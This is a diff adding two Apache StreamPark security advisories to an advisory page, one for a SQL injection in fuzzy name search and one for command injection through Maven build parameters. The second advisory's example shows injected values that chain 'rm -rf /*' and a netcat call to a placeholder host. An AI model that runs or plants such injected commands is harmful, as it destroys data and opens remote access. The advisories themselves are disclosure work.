@@ -62,3 +62,37 @@ CVE-2022-46365 [\[CVE json\]](./CVE-2022-46365.cve.json)
 
 ### References
 * https://lists.apache.org/thread/f68lcwrp8pcdc4yrbpcm8j7m0f5mjn7h
+
+
+## Authenticated system users could trigger SQL injection vulnerability ## { #CVE-2023-30867 }
+
+CVE-2023-30867 [\[CVE json\]](./CVE-2023-30867.cve.json)
+
+### Affected
+
+* Apache StreamPark (incubating) from 2.0.0 before 2.1.2
+
+
+### Description
+
+<div><span style="background-color: var(--wht);">In the Streampark platform, when users log in to the system and use certain features, some pages provide a name-based fuzzy search, such as job names, role names, etc. The sql syntax :select * from table where jobName like '%jobName%'. However, the jobName field may receive illegal parameters, leading to SQL injection. This could potentially result in information leakage.</span><div><span style="background-color: var(--wht);"><br></span></div><br><div>Mitigation:</div><div><br></div><span style="background-color: rgb(255, 255, 255);">Users are recommended to upgrade to version 2.1.2, which fixes the issue.</span><br><br></div><br><p></p>
+
+### References
+* https://lists.apache.org/thread/bhdzh6hnh04yyf3g203bbyvxryd720o2
+
+
+## Authenticated system users could trigger remote command execution ## { #CVE-2023-49898 }
+
+CVE-2023-49898 [\[CVE json\]](./CVE-2023-49898.cve.json)
+
+### Affected
+
+* Apache StreamPark (incubating) from 2.0.0 before 2.1.2
+
+
+### Description
+
+<div>In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.<br><br><div>Mitigation:<br><br></div>all users&nbsp;<span style="background-color: var(--wht);">should upgrade to 2.1.2</span><div><br></div><br><div>Example:<br><br><div><p></p><div>##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &amp;&amp;, compilation failure use "||" or "&amp;&amp;":<br><br><span style="background-color: var(--wht);">/usr/share/java/maven-3/conf/settings.xml || rm -rf /*</span><br></div><p></p></div></div><div><div>/usr/share/java/maven-3/conf/settings.xml &amp;&amp; nohup nc x.x.x.x 8899 &amp;</div><br></div></div><p></p>
+
+### References
+* https://lists.apache.org/thread/qj99c03r4td35f8gbxq084b8qmv2fyr3
